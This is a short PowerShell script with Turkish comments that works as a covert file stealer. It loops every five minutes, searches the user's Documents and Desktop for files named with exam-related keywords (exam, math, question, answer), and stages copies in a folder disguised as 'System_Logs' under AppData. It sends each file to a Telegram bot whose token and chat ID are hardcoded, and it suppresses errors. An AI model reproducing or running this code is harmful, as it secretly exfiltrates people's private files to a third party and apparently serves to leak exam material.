# --- YAPILANDIRMA ---
$botToken = "7963651435:AAEwnINCDTKPfNi4nTns-7pykoSaBWIC05M"
$chatId = "7036117225"
$lootDir = "$env:APPDATA\System_Logs"
if (!(Test-Path $lootDir)) { New-Item -ItemType Directory -Force -Path $lootDir }
$keywords = @("*sinav*", "*matematik*", "*9.*", "*soru*", "*cevap*")
# ---------------------

while($true) {
    # Yeni dosyaları bul
    $files = Get-ChildItem -Path "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop" -Include $keywords -Recurse -ErrorAction SilentlyContinue
    
    foreach ($file in $files) {
        # Eğer dosya daha önce gönderilmediyse (Loot klasöründe yoksa)
        $destFile = Join-Path $lootDir $file.Name
        if (!(Test-Path $destFile)) {
            # Dosyayı yerel yedeğe kopyala
            Copy-Item $file.FullName -Destination $destFile -Force
            
            # Telegram'a gönder
            try {
                $uri = "https://api.telegram.org/bot$botToken/sendDocument?chat_id=$chatId"
                $form = @{ document = Get-Item $file.FullName }
                Invoke-RestMethod -Uri $uri -Method Post -Form $form
            } catch {
                # Bağlantı yoksa bir sonraki döngüde tekrar dener
            }
        }
    }
    Start-Sleep -Seconds 300 # 5 dakikada bir kontrol et
}
